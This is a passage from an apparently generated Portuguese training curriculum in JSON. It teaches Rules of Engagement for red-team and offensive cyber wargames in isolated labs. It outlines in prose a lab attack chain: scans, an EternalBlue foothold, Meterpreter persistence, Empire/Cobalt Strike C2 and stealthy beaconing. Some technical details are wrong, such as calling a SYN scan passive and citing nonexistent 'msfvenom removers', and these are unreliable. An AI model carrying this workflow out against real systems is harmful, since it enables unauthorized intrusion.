                                  "learningObjective": "Interpretar como e quando escalonar respostas baseadas em condições dinâmicas.",
                                  "commonMistakes": [
                                    "Escalonar prematuramente sem confirmação; ignorar impactos colaterais em infraestruturas críticas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Ferramentas de Ethical Hacking para Validação de ROE",
                                  "subSteps": [
                                    "Selecionar ferramentas: Wireshark para C2, Metasploit para simulação de threats.",
                                    "Executar simulação: injetar tráfego simulado para testar triggers e escalonamento.",
                                    "Analisar logs para validar ativação/escalonamento conforme ROE.",
                                    "Relatar achados: correlacionar dados de hacking com componentes ROE de SIMPSON et al.",
                                    "Refinar ROE baseado em lições aprendidas da simulação."
                                  ],
                                  "verification": "Gerar um relatório de 2 páginas com evidências de uma simulação bem-sucedida de ROE.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "VMs para lab (Kali Linux, Vulnerable machines como Metasploitable), Wireshark, Metasploit"
                                  ],
                                  "tips": "Use ambientes isolados para evitar riscos reais; documente todos os comandos executados.",
                                  "learningObjective": "Aplicar ethical hacking para testar e validar interpretação de ROE em cenários reais.",
                                  "commonMistakes": [
                                    "Não isolar o ambiente de teste; interpretar ruído como threat real."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético simulando um ataque APT a uma rede crítica, um trigger de ativação ocorre quando beacons C2 são detectados (nível de ameaça médio via Wireshark), escalonando para fase de disrupção com injeção de sinkholes após aprovação de comando superior, conforme ROE estruturadas por SIMPSON et al.",
                              "finalVerifications": [
                                "Explicar corretamente 3 triggers de ativação com exemplos quantitativos.",
                                "Desenhar fluxograma de escalonamento para um cenário APT.",
                                "Simular e validar uma ROE completa usando ethical hacking tools.",
                                "Identificar 2 riscos de escalonamento incorreto em operações reais.",
                                "Correlacionar achados com referências de SIMPSON et al.",
                                "Listar 4 ferramentas para monitoramento de triggers cibernéticos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de triggers e escalonamento (30%)",
                                "Profundidade na integração de ethical hacking (25%)",
                                "Clareza e completude de diagramas/relatórios (20%)",
                                "Aplicação correta de conceitos de SIMPSON et al. (15%)",
                                "Identificação de erros comuns e mitigação (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Ethical Hacking (SC-05): Uso de ferramentas para validação de threats.",
                                "Análise de Inteligência (INT-01): Correlação de SIGINT com triggers ROE.",
                                "Direito Internacional Cibernético (LW-03): Proporcionalidade em escalonamento.",
                                "Gestão de Riscos (RM-02): Avaliação de blowback em operações ofensivas.",
                                "Simulações de Wargames (GW-01): Aplicação prática em exercícios SC-06."
                              ],
                              "realWorldApplication": "Em operações de defesa cibernética do tipo Cyber Command (e.g., USCYBERCOM), interpretar ROE permite equipes de resposta escalonarem contra-ataques a invasões estatais, como bloquear C2 de malware russo em infraestruturas críticas, evitando escalada desnecessária e garantindo conformidade legal."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.3",
                            "name": "Mapear componentes ROE a cenários de Red Team",
                            "description": "Aplicar componentes em simulações de ataques, considerando organização do Red Team e bibliografia como MURDOCH para threat hunting reverso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Componentes Estruturais das ROE",
                                  "subSteps": [
                                    "Estude as definições oficiais de ROE em operações cibernéticas ofensivas.",
                                    "Liste os componentes principais: autoridade, escopo, regras de ação, limitações e mecanismos de revisão.",
                                    "Analise exemplos de ROE de doutrinas militares adaptadas ao ciberespaço.",
                                    "Crie um diagrama visual dos componentes e suas inter-relações.",
                                    "Revise bibliografia relevante para contextualização em jogos de guerra cibernética."
                                  ],
                                  "verification": "Diagrama completo dos componentes ROE criado e compreendido, com pelo menos 5 componentes identificados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Doutrina militar sobre ROE (ex: NATO ROE Handbook)",
                                    "Documentos de SC-06 sobre operações cibernéticas",
                                    "Ferramentas de diagramação como Draw.io"
                                  ],
                                  "tips": "Priorize componentes que impactam diretamente ações ofensivas para relevância em Red Team.",
                                  "learningObjective": "Identificar e descrever com precisão todos os componentes estruturais das ROE em contexto cibernético.",
                                  "commonMistakes": [
                                    "Confundir ROE com LOAC (Leis de Conflito Armado)",
                                    "Ignorar componentes de revisão e escalada",
                                    "Não contextualizar para ciberoperações"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Organização e Cenários Típicos de Red Team",
                                  "subSteps": [
                                    "Descreva a estrutura organizacional de um Red Team: líder, operadores, analistas e suporte legal.",
                                    "Identifique cenários comuns: pentest autorizado, simulações de APT, exercícios de guerra cibernética.",
                                    "Mapeie fases de um ataque Red Team (reconhecimento, exploração, pós-exploração, etc.).",
                                    "Estude integrações com Blue Team para simulações realistas.",
                                    "Considere variações baseadas em objetivos organizacionais ou nacionais."
                                  ],
                                  "verification": "Relatório com organograma do Red Team e lista de 5 cenários detalhados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Framework",
                                    "Livros sobre Red Teaming (ex: 'Red Team Field Manual')",
                                    "Templates de relatórios Red Team"
                                  ],
                                  "tips": "Use frameworks como Cyber Kill Chain para estruturar cenários de forma padronizada.",
                                  "learningObjective": "Descrever a organização Red Team e mapear cenários operacionais chave.",
                                  "commonMistakes": [
                                    "Subestimar o papel legal/ético no Red Team",
                                    "Focar apenas em ataques técnicos sem contexto organizacional",
                                    "Ignorar feedback loops com Blue Team"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Componentes ROE aos Cenários de Red Team",
                                  "subSteps": [
                                    "Crie uma tabela de mapeamento: coluna para componente ROE e coluna para cenários Red Team correspondentes.",
                                    "Para cada componente, identifique 2-3 cenários onde se aplica (ex: autoridade → autorização para spear-phishing).",
                                    "Inclua considerações de risco e escalada em cada mapeamento.",
                                    "Valide mapeamentos com exemplos hipotéticos de simulações.",
                                    "Documente exceções ou adaptações necessárias para cibercontexto."
                                  ],
                                  "verification": "Tabela de mapeamento completa com pelo menos 80% de cobertura dos componentes ROE.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para tabelas",
                                    "Casos de estudo de Red Team (ex: DEF CON reports)",
                                    "Referências ROE cibernéticas"
                                  ],
                                  "tips": "Use cores na tabela para destacar níveis de criticidade (alto/baixo risco).",
                                  "learningObjective": "Estabelecer mapeamentos precisos e acionáveis entre ROE e atividades Red Team.",
                                  "commonMistakes": [
                                    "Mapeamentos genéricos sem exemplos específicos",
                                    "Não considerar limitações legais em cenários",
                                    "Sobrecarregar um componente em múltiplos cenários sem justificativa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Threat Hunting Reverso com MURDOCH e Simular",
                                  "subSteps": [
                                    "Estude o framework MURDOCH para threat hunting reverso em Red Team.",
                                    "Adapte mapeamentos ROE incorporando MURDOCH (ex: Modelar → mapear escopo ROE).",
                                    "Desenvolva uma simulação curta: aplique mapeamento em um cenário de ataque simulado.",
                                    "Execute a simulação em ambiente controlado e registre violações potenciais de ROE.",
                                    "Ajuste mapeamentos baseados em lições aprendidas da simulação."
                                  ],
                                  "verification": "Relatório de simulação com mapeamentos ajustados e lições incorporando MURDOCH.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramentas de simulação (ex: Atomic Red Team, Caldera)",
                                    "Bibliografia MURDOCH",
                                    "Ambiente virtual lab (ex: TryHackMe)"
                                  ],
                                  "tips": "Grave a simulação para revisão posterior e análise de conformidade ROE.",
                                  "learningObjective": "Aplicar mapeamentos em simulações realistas com threat hunting reverso.",
                                  "commonMistakes": [
                                    "Não integrar MURDOCH adequadamente",
                                    "Simulações sem checkpoints de ROE",
                                    "Ignorar impactos éticos na simulação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team de invasão a uma rede corporativa simulada, mapeie o componente ROE 'regras de ação' ao cenário de privilege escalation: só avance se autorização explícita for obtida, evitando danos colaterais como DDoS não autorizado, e use MURDOCH para modelar defesas reversas.",
                              "finalVerifications": [
                                "Tabela de mapeamento completa e validada cobre todos componentes ROE.",
                                "Simulação executada sem violações de ROE identificadas.",
                                "Integração de MURDOCH documentada em pelo menos 3 mapeamentos.",
                                "Relatório final inclui exemplos práticos e ajustes.",
                                "Diagrama visual de mapeamentos criado e compreendido.",
                                "Auto-avaliação de conformidade com SC-06 realizada."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude dos mapeamentos (90%+ cobertura).",
                                "Relevância dos cenários Red Team ao contexto cibernético ofensivo.",
                                "Integração efetiva de MURDOCH e threat hunting reverso.",
                                "Qualidade da simulação: realismo e aderência a ROE.",
                                "Clareza na documentação e diagramas.",
                                "Identificação proativa de riscos e erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Paralelos com ROE em operações convencionais.",
                                "Direito Internacional: Conformidade com tratados cibernéticos (ex: Tallinn Manual).",
                                "Gestão de Riscos: Frameworks como NIST para avaliação de cenários.",
                                "Inteligência Artificial: Uso de simulações AI-driven para Red Team.",
                                "Liderança e Ética: Tomada de decisões em equipes multidisciplinares."
                              ],
                              "realWorldApplication": "Em operações de ciberdefesa governamentais ou corporativas, esse mapeamento garante que simulações Red Team respeitem ROE legais e éticas, minimizando riscos jurídicos durante exercícios de guerra cibernética e melhorando a readiness contra ameaças reais via threat hunting reverso."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.3",
                        "name": "Aplicação Prática das ROE em Operações Ofensivas",
                        "description": "Implementação das ROE durante execução de ataques cibernéticos, incluindo monitoramento, relatórios de violação e adaptação em tempo real para manter conformidade em jogos de guerra cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.3.1",
                            "name": "Simular aplicação de ROE em um cenário de ataque cibernético",
                            "description": "Executar um exercício prático de Red Team onde ROE guiam ações de ethical hacking, persistência e C2, registrando decisões baseadas em limites operacionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir o Cenário de Simulação e Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Crie um cenário fictício de ataque cibernético, como uma rede corporativa com servidores vulneráveis e sistemas críticos.",
                                    "Redija ROE claras, incluindo limites como 'não acessar dados sensíveis de usuários reais', 'parar se detecção > 50%', e 'autorização para persistência apenas em VMs designadas'.",
                                    "Documente papéis: Red Team (atacante), Blue Team (defensor), e regras de vitória/derrota.",
                                    "Revise ROE com um parceiro para garantir clareza e realismo.",
                                    "Salve o documento de cenário e ROE em formato legível (PDF ou Markdown)."
                                  ],
                                  "verification": "Verifique se o documento de cenário e ROE está completo, com pelo menos 5 regras específicas e assinado digitalmente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Editor de texto (VS Code ou Word)",
                                    "Templates de ROE de fontes como MITRE ATT&CK",
                                    "Documentação de cenários cibernéticos (ex: Cyber Range blueprints)"
                                  ],
                                  "tips": "Use ROE baseadas em frameworks reais como NIST ou military ROE para autenticidade; mantenha-as concisas mas abrangentes.",
                                  "learningObjective": "Compreender como ROE delimitam ações em operações ofensivas cibernéticas.",
                                  "commonMistakes": [
                                    "ROE vagas ou ambíguas",
                                    "Ignorar impactos éticos/legais",
                                    "Não incluir critérios de parada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Ambiente de Laboratório Seguro",
                                  "subSteps": [
                                    "Instale VMs isoladas: uma para alvo (ex: Metasploitable ou VulnHub), uma para atacante (Kali Linux), e uma para monitoramento.",
                                    "Configure rede virtual (VirtualBox/VMware) com firewall e snapshot para reset.",
                                    "Instale ferramentas: Nmap, Metasploit, Empire (para C2), Wireshark.",
                                    "Teste conectividade e isole o lab da internet real.",
                                    "Crie backups e planeje limpeza pós-exercício."
                                  ],
                                  "verification": "Execute ping e scan básico Nmap para confirmar que o ambiente está operacional e isolado.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "VirtualBox ou VMware",
                                    "Imagens de VMs: Kali Linux, Metasploitable",
                                    "Ferramentas: Nmap, Metasploit, Covenant/Empire para C2"
                                  ],
                                  "tips": "Sempre use snapshots para reverter mudanças; documente IPs e portas usadas.",
                                  "learningObjective": "Montar um ambiente controlado para simulações de Red Team sem riscos reais.",
                                  "commonMistakes": [
                                    "Expor lab à internet",
                                    "Esquecer snapshots",
                                    "Ferramentas desatualizadas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Reconhecimento e Acesso Inicial Guiado por ROE",
                                  "subSteps": [
                                    "Inicie scan passivo (Nmap -sS) e verifique ROE: 'permitido apenas portas comuns'.",
                                    "Identifique vulnerabilidades (ex: EternalBlue) e decida acesso baseado em ROE (ex: 'evitar exploits de alto impacto').",
                                    "Simule phishing ou exploit para foothold, registrando decisão ROE.",
                                    "Monitore detecção com Wireshark e pare se ROE violada.",
                                    "Documente todas as ações em log timestamped."
                                  ],
                                  "verification": "Confirme foothold (shell reversa) e revise log para conformidade ROE.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Nmap, Nikto, Metasploit",
                                    "Wireshark para monitoramento",
                                    "Logbook digital (Notion ou Excel)"
                                  ],
                                  "tips": "Registre screenshots de cada decisão ROE; pratique scans stealth para realismo.",
                                  "learningObjective": "Aplicar ROE em fases iniciais de ataque cibernético.",
                                  "commonMistakes": [
                                    "Prosseguir sem checar ROE",
                                    "Scans agressivos que disparam alertas",
                                    "Logs incompletos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Persistência e C2 com Conformidade ROE",
                                  "subSteps": [
                                    "Instale persistence (ex: backdoor Meterpreter) apenas se ROE permitir (ex: 'persistência em VMs não-críticas').",
                                    "Configure C2 (Empire ou Cobalt Strike simulado) e teste comando remoto.",
                                    "Monitore tráfego e decida escalação baseado em ROE (ex: 'não exfiltrar dados simulados').",
                                    "Simule detecção e resposta: pause se Blue Team 'detecta'.",
                                    "Registre trade-offs: benefício vs. risco ROE."
                                  ],
                                  "verification": "Teste C2 com comandos básicos e confirme log de decisões ROE.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Metasploit Persistence modules",
                                    "Empire ou Sliver para C2",
                                    "Scripts de monitoramento"
                                  ],
                                  "tips": "Use beacons low-and-slow para evitar detecção; priorize ROE em cada comando.",
                                  "learningObjective": "Gerenciar operações avançadas de Red Team dentro de limites operacionais.",
                                  "commonMistakes": [
                                    "Persistência sem autorização ROE",
                                    "C2 ruidoso",
                                    "Ignorar cleanup"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar Decisões, Debrief e Limpeza",
                                  "subSteps": [
                                    "Compile log completo: ações, decisões ROE, timestamps, screenshots.",
                                    "Realize auto-debrief: o que funcionou, violações evitadas, lições.",
                                    "Limpe ambiente: remova artifacts, reverta snapshots.",
                                    "Avalie sucesso vs. ROE e critérios de vitória.",
                                    "Compartilhe relatório com formato profissional."
                                  ],
                                  "verification": "Ambiente limpo (scan pós-limpeza) e relatório completo com análise ROE.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de cleanup (msfvenom removers)",
                                    "Template de relatório AAR (After Action Review)"
                                  ],
                                  "tips": "Use rubrica ROE para scoring; inclua métricas quantitativas (ex: tempo até detecção).",
                                  "learningObjective": "Refletir e documentar aplicações de ROE para melhoria contínua.",
                                  "commonMistakes": [
                                    "Limpeza incompleta",
                                    "Debrief superficial",
                                    "Relatório sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com VM Metasploitable como alvo corporativo, ROE proíbem exfiltração de dados >1MB e ataques pós-18h. Use Nmap para recon (aprovado), ganhe shell via SMB exploit (aprovado), instale backdoor Empire (aprovado pois VM não-crítica), mas pare C2 agressivo ao simular detecção Blue Team, registrando 'ROE 4.2 violada se prosseguir'.",
                              "finalVerifications": [
                                "Log completo com todas decisões ROE timestamped e justificadas.",
                                "Ambiente de lab restaurado a estado inicial via snapshots.",
                                "Relatório de debrief com análise de conformidade ROE (>90%).",
                                "Evidências visuais (screenshots/logs) de pelo menos 10 decisões ROE.",
                                "Auto-avaliação de sucesso operacional sem violações.",
                                "Checklist de cleanup assinado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na aplicação de ROE em todas fases (100% conformidade).",
                                "Qualidade e completude da documentação (detalhes acionáveis).",
                                "Eficácia da simulação (foothold + C2 estabelecidos).",
                                "Análise reflexiva no debrief (lições identificadas).",
                                "Segurança e isolamento do lab mantidos.",
                                "Tempo respeitado e eficiência demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito Cibernético: Análise de limites legais em ROE.",
                                "Gestão de Projetos: Planejamento e debrief de operações.",
                                "Inteligência Artificial: Uso de tools automatizados em C2.",
                                "Comunicações: Relatórios claros e AAR.",
                                "Psicologia: Tomada de decisão sob restrições."
                              ],
                              "realWorldApplication": "Em pentests profissionais ou operações de ciberdefesa nacional (ex: USCYBERCOM), ROE guiam Red Teams para evitar escaladas reais, como em exercícios como Cyber Flag, garantindo ações éticas, legais e controladas em ataques simulados contra infraestruturas críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.2",
                            "name": "Avaliar violações e correções de ROE durante operações",
                            "description": "Identificar potenciais breaches em cenários de pivoting e propor mecanismos de correção, alinhados a consciência situacional e indicadores de compromisso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Monitorar operações e identificar potenciais violações de ROE",
                                  "subSteps": [
                                    "Revisar continuamente os logs de atividade durante cenários de pivoting.",
                                    "Comparar ações realizadas com as regras definidas nas ROE.",
                                    "Identificar indicadores de compromisso (IoCs) que possam sinalizar breaches.",
                                    "Mapear ações a requisitos de consciência situacional.",
                                    "Registrar timestamps e contextos de eventos suspeitos."
                                  ],
                                  "verification": "Lista de potenciais violações identificadas com evidências dos logs.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas de monitoramento (SIEM, ELK Stack)",
                                    "Documentos ROE atualizados",
                                    "Logs de operações simuladas"
                                  ],
                                  "tips": "Priorize alertas em tempo real para evitar escalada de violações.",
                                  "learningObjective": "Desenvolver habilidade em detecção proativa de desvios das ROE.",
                                  "commonMistakes": "Ignorar violações menores que podem acumular em breaches graves."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar violações identificadas e avaliar impacto",
                                  "subSteps": [
                                    "Classificar a violação quanto à gravidade (leve, moderada, crítica).",
                                    "Avaliar o impacto na consciência situacional e objetivos da operação.",
                                    "Verificar se o pivoting ultrapassou limites geográficos ou de alvos permitidos.",
                                    "Consultar indicadores de compromisso para contextualizar o breach.",
                                    "Documentar cadeia de evidências e possíveis causas raiz."
                                  ],
                                  "verification": "Relatório de análise com classificação de gravidade e impacto quantificado.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Templates de análise de incidentes",
                                    "Matriz de ROE",
                                    "Ferramentas de análise forense (Wireshark)"
                                  ],
                                  "tips": "Use frameworks como MITRE ATT&CK para mapear táticas envolvidas.",
                                  "learningObjective": "Capacitar análise precisa de breaches alinhada à consciência situacional.",
                                  "commonMistakes": "Subestimar impactos indiretos, como exposição de inteligência."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Propor mecanismos de correção alinhados às ROE",
                                  "subSteps": [
                                    "Brainstorm de opções de correção: rollback, contenção ou realinhamento.",
                                    "Garantir que correções respeitem ROE e minimizem danos colaterais.",
                                    "Priorizar ações baseadas em risco e tempo de resposta.",
                                    "Simular correções em ambiente controlado.",
                                    "Obter aprovação de comando se necessário."
                                  ],
                                  "verification": "Plano de correção documentado com opções priorizadas e simulação bem-sucedida.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ambiente de simulação (VMs, labs cibernéticos)",
                                    "Templates de plano de correção",
                                    "Contato com equipe de comando"
                                  ],
                                  "tips": "Sempre valide correções com ROE para evitar violações secundárias.",
                                  "learningObjective": "Habilidade em propor soluções corretivas éticas e eficazes.",
                                  "commonMistakes": "Propor correções agressivas que violem ROE adicionais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar correções e verificar conformidade",
                                  "subSteps": [
                                    "Executar plano de correção em ambiente operacional.",
                                    "Monitorar pós-implementação para confirmar resolução.",
                                    "Atualizar logs e relatar lições aprendidas.",
                                    "Realizar auditoria final de conformidade com ROE.",
                                    "Ajustar processos preventivos baseados na experiência."
                                  ],
                                  "verification": "Relatório final confirmando resolução sem novas violações.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Acesso a sistemas operacionais",
                                    "Ferramentas de automação (Ansible)",
                                    "Formulários de relatório pós-operação"
                                  ],
                                  "tips": "Teste correções em staging antes de produção para segurança.",
                                  "learningObjective": "Garantir ciclo completo de resposta a violações com verificação.",
                                  "commonMistakes": "Não documentar lições, repetindo erros em operações futuras."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando pivoting em rede inimiga, uma ação de exfiltração de dados ultrapassa limite de ROE (alvo não autorizado). Identifique a violação nos logs, analise impacto (risco de detecção), proponha rollback via kill-switch e verifique conformidade pós-correção.",
                              "finalVerifications": [
                                "Identificação correta de 100% das violações simuladas.",
                                "Análise de impacto precisa em cenários variados.",
                                "Propostas de correção viáveis e alinhadas às ROE.",
                                "Implementação sem introduzir novas violações.",
                                "Relatório completo com lições aprendidas.",
                                "Tempo de resposta total abaixo de 3 horas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de breaches (90%+).",
                                "Qualidade da análise de impacto (com evidências).",
                                "Criatividade e conformidade das correções propostas.",
                                "Eficiência temporal na execução dos steps.",
                                "Documentação clara e acionável.",
                                "Integração de consciência situacional em todas as etapas."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Aplicação de normas internacionais em ciberoperações.",
                                "Análise de Dados: Uso de SIEM e forense digital.",
                                "Gestão de Riscos: Modelos como NIST para avaliação de impacto.",
                                "Liderança: Tomada de decisão sob pressão em cenários simulados."
                              ],
                              "realWorldApplication": "Durante operações cibernéticas ofensivas reais, como em conflitos híbridos, permite resposta rápida a breaches de ROE, evitando escaladas diplomáticas e mantendo legitimidade operacional, similar a exercícios da NSA ou operações do Cyber Command."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.3",
                            "name": "Integrar ROE com planejamento de cenários de ameaça",
                            "description": "Incorporar ROE no ciclo de planejamento de operações ofensivas, utilizando artigos científicos e guias como Hands-on Ethical Hacking para validação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de ROE e Cenários de Ameaça",
                                  "subSteps": [
                                    "Defina ROE (Regras de Engajamento) no contexto de operações cibernéticas ofensivas, incluindo limites legais e éticos.",
                                    "Identifique componentes chave de cenários de ameaça: atores, vetores, impactos e probabilidades.",
                                    "Estude exemplos de ROE de doutrinas militares (ex: JP 3-0 Joint Operations) adaptadas para ciberespaço.",
                                    "Compile uma lista de cenários de ameaça comuns em operações ofensivas cibernéticas (ex: DDoS, ransomware).",
                                    "Compare ROE tradicionais com cibernéticas usando artigos científicos como 'Cyber ROE' de Schmitt."
                                  ],
                                  "verification": "Criar um glossário com 10 termos chave e mapa conceitual ligando ROE a cenários de ameaça.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "JP 3-0 Joint Operations (PDF)",
                                    "Artigo 'Cyber Rules of Engagement' de Michael Schmitt",
                                    "Hands-on Ethical Hacking and Network Defense (capítulos iniciais)"
                                  ],
                                  "tips": "Use mind maps para visualizar conexões; foque em ROE preventivas vs. reativas.",
                                  "learningObjective": "Compreender os elementos fundamentais de ROE e cenários de ameaça para integração posterior.",
                                  "commonMistakes": [
                                    "Confundir ROE com ROA (Rules of Armed Conflict)",
                                    "Ignorar aspectos legais internacionais como Convenção de Genebra"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Ciclo de Planejamento de Operações Ofensivas",
                                  "subSteps": [
                                    "Descreva o ciclo OODA (Observe, Orient, Decide, Act) aplicado a operações cibernéticas.",
                                    "Mapeie fases do planejamento: inteligência, simulação, execução e avaliação.",
                                    "Identifique pontos de inserção para ROE em cada fase do ciclo.",
                                    "Revise guias como Hands-on Ethical Hacking para exemplos de planejamento ético.",
                                    "Crie um fluxograma do ciclo de planejamento com anotações de ROE."
                                  ],
                                  "verification": "Produzir um fluxograma detalhado com pelo menos 5 pontos de integração ROE.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Hands-on Ethical Hacking and Network Defense (cap. 5-7)",
                                    "FM 6-0 Commander and Staff Organization and Operations",
                                    "Ferramenta de diagramação como Lucidchart ou Draw.io"
                                  ],
                                  "tips": "Adapte OODA para cenários cibernéticos voláteis; priorize 'Orient' para ROE dinâmicas.",
                                  "learningObjective": "Mapear o ciclo de planejamento e identificar oportunidades para incorporar ROE.",
                                  "commonMistakes": [
                                    "Sobrestimar velocidade do OODA em ciberoperações",
                                    "Omitir feedback loops pós-execução"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Framework de Integração ROE-Cenários",
                                  "subSteps": [
                                    "Crie matriz de integração: linhas como cenários de ameaça, colunas como regras ROE.",
                                    "Defina critérios para alinhamento: legalidade, proporcionalidade, necessidade.",
                                    "Incorpore validações de artigos científicos (ex: estudos de caso de Stuxnet com ROE implícitas).",
                                    "Desenvolva templates para cenários: 'Se [ameaça], então [ROE aplicada]'.",
                                    "Teste framework com 3 cenários hipotéticos fictícios."
                                  ],
                                  "verification": "Gerar matriz de integração completa com 5 cenários e 4 regras ROE cada.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Artigo 'Ethical Hacking ROE' de journals IEEE",
                                    "Hands-on Ethical Hacking (exercícios de planejamento)",
                                    "Planilha Excel ou Google Sheets para matriz"
                                  ],
                                  "tips": "Use cores na matriz para risco (vermelho=alto); itere com base em validações científicas.",
                                  "learningObjective": "Construir um framework acionável para integrar ROE em planejamento de cenários.",
                                  "commonMistakes": [
                                    "Falta de granularidade nos cenários",
                                    "Ignorar ROE escaláveis por intensidade de ameaça"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Simular Integração em Exercício Prático",
                                  "subSteps": [
                                    "Simule um cenário de operação ofensiva: planeje ataque a rede simulada com ROE restritivas.",
                                    "Aplique framework: ajuste plano com base em ROE e valide com guias éticos.",
                                    "Realize debrief: avalie violações potenciais e ajustes.",
                                    "Compare com casos reais anonimizados de literatura (ex: cyber wargames).",
                                    "Documente lições aprendidas e refine framework."
                                  ],
                                  "verification": "Relatório de simulação de 2 páginas com plano ajustado e análise de conformidade ROE.",
                                  "estimatedTime": "6 horas",
                                  "materials": [
                                    "Ferramentas de simulação como Cyber Range ou Wireshark",
                                    "Hands-on Ethical Hacking labs",
                                    "Templates de relatório militar"
                                  ],
                                  "tips": "Grave simulação para revisão; envolva pares para role-play de comandante.",
                                  "learningObjective": "Aplicar e validar a integração ROE em um contexto simulado realista.",
                                  "commonMistakes": [
                                    "Não simular respostas adversárias",
                                    "Subestimar ambiguidades em ROE cibernéticas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético, planeje uma operação ofensiva contra uma rede inimiga simulada. Identifique ameaça de C2 server (cenário alto risco); integre ROE limitando a disrupção sem dano colateral, validando com checklist de proporcionalidade de Hands-on Ethical Hacking, resultando em plano que autoriza apenas DDoS controlado após confirmação de alvos não-críticos.",
                              "finalVerifications": [
                                "Matriz de integração cobre 80% dos cenários comuns com ROE alinhadas.",
                                "Simulação bem-sucedida sem violações ROE identificadas no debrief.",
                                "Relatório cita pelo menos 3 fontes científicas/guias para validação.",
                                "Fluxograma OODA inclui ROE em todas as fases.",
                                "Auto-avaliação demonstra compreensão de legalidade e ética.",
                                "Framework testado em 3 cenários variados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e mapeamento de ROE (30%)",
                                "Profundidade da integração no ciclo de planejamento (25%)",
                                "Uso efetivo de literatura científica e guias (20%)",
                                "Qualidade da simulação e análise de riscos (15%)",
                                "Clareza e completude da documentação (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Ciclo OODA e doutrinas joint operations.",
                                "Direito Internacional: Convenções de Genebra e ciberguerra.",
                                "Ética em TI: Princípios de hacking ético de CEH.",
                                "Inteligência: Análise de ameaças APT.",
                                "Gestão de Riscos: Frameworks como NIST Cybersecurity."
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares reais, como as conduzidas pelo USCYBERCOM, integrar ROE no planejamento de cenários previne escaladas indesejadas, assegura conformidade legal em ataques a infraestruturas críticas e otimiza respostas a ameaças persistentes avançadas (APTs), como visto em relatórios de wargames do NATO CCDCOE."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.4",
                            "name": "Relatar conformidade ROE em debriefings de Red Team",
                            "description": "Documentar adesão às ROE pós-operação, incluindo lições aprendidas para iterações futuras em jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Regras de Engajamento (ROE) e Coletar Logs da Operação",
                                  "subSteps": [
